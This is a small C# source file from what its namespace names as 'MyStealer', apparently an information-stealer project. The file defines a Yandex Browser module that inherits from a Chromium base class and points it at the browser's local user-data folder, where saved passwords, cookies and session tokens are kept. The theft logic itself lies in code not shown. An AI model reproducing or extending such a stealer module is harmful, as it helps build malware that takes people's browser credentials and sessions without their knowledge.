using System.IO;
using System;

namespace MyStealer.Modules.Browser.ChromiumBased
{
    internal class YandexBrowser : Chromium
    {
        public override string ApplicationName => "Yandex Browser";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex", "YandexBrowser", "User Data");
    }
}
